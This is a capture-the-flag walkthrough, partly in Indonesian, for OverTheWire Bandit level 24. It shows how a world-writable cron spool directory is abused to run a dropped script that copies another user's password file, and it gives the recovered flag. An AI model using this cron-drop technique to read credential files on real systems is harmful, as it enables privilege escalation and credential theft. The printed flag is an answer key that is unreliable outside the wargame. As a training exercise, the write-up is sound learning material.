---
layout: level
level: 24
previous: ./level 23.html
next: ./level 25.html
---

# soal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! \
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# solve
- check cronjob file
    ```bash
    cd /etc/cron.d
    cat cronjob_bandit24
    # @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    # * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    ```

- check the file ````cat /usr/bin/cronjob_bandit24.sh```
    ```bash
    #!/bin/bash

    myname=$(whoami)

    cd /var/spool/$myname/foo
    echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
    for i in * .*;
    do
        if [ "$i" != "." -a "$i" != ".." ];
        then
            echo "Handling $i"
            owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
    done

    # disini jika saya teliti di file ini akan pergi ke location folder tertentu dulu /var/spool/$myname/foo
    # setelah itu dia akan melakuakn looping pada semua file di dalamnya
    # dan akan mengekseskusinya dan setelah itu menghapusnya
    ```

- check the permissions
    ```bash
    ls -lad /var/spool/bandit24/foo
    # drwxrwx-wx 23 root bandit24 4096 Dec 10 09:52 /var/spool/bandit24/foo
    ls -la /var/spool/bandit24/foo
    # ls: cannot open directory '/var/spool/bandit24/foo': Permission denied

    ## kita tidak memiliki akses read pada folder namun kita memiliki akses write yang artinya
    ## kita bisa menaruh file di directory tersebut yang nantinya akan di eksekusi oleh cronjob
    ```

- try create file tmp for location pass
    ```bash
    echo -e "\n[+] output ----------" # debug
    workdir=$(mktemp -d)
    cd $workdir
    touch pass

    ls -lad $workdir
    # drwx------ 2 bandit23 bandit23 4096 Dec 10 09:57 /tmp/tmp.wp45LLE77H
    ## disini bisa kita lihat bahwa tmp tersebut tidak bisa di write jadi kita perlu mengubah permissions nya juga

    chmod -R 777 $workdir
    ls -lad $workdir
    # drwxrwxrwx 2 bandit23 bandit23 4096 Dec 10 09:57 /tmp/tmp.wp45LLE77H
    ls -la pass

    echo -e "\n[+] output ----------" # debug
    echo -e "[+] change the dir write for $(pwd)/pass" # debug
    ```

- try executable fro cat the pass
    ```bash
    cd /var/spool/bandit24/foo
    cat > cat_pass << EOF
    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > # the path
    EOF

    ls -la cat_pass
    chmod 777 cat_pass
    cat $workdir/pass
    ```

- tunggu hingga file terhapus, dan pass terisi
    ```bash
    ls -la cat_pass
    # -rwxrwxrwx 1 bandit23 bandit23 81 Dec 10 10:17 cat_pass
    cat $workdir/pass

    ls -la cat_pass
    # ls: cannot access 'cat_pass': No such file or directory
    cat $workdir/pass
    # gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

    ## jika masihh gagal kemungkinan kesalahan di permissions
    ## atau di location file
    ```

# flag
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8